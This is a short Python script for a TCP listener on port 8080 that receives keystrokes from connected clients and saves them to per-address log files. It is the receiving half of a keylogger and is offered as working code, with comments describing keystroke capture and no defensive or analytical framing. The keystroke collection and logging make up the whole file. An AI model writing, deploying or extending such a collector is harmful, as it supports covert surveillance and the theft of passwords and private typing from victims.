import socket

while True:
    
    # create a socket instance
    s = socket.socket()
    print("")
    print("Socket created.")

    port = 8080

    # bind socket to the chosen port
    s.bind(('0.0.0.0', port))
    print("Socket binded to ", port)

    # listen for any incoming connection 
    s.listen(5)
    print("Socket is listening...")

    # accept a connection if one arrives
    c, addr = s.accept()
    print("Got connection from ", addr)

    # open a text file to log all the keystrokes being received from the client
    f = open(f"keylogs_{addr}.txt", "w")
    
    # infinite loop to keep receiving keystrokes from the connected client
    while True:
        try:
            key = c.recv(1024).decode()
            if len(key)==0:
                print("")
                print("Client must have disconnected.")
                f.close()
                break
            print(key, end="", flush=True)
            f.write(key)
            f.flush()
        except:
            print("")
            print("Client must have disconnected.")
            f.close()
            break
    c.close()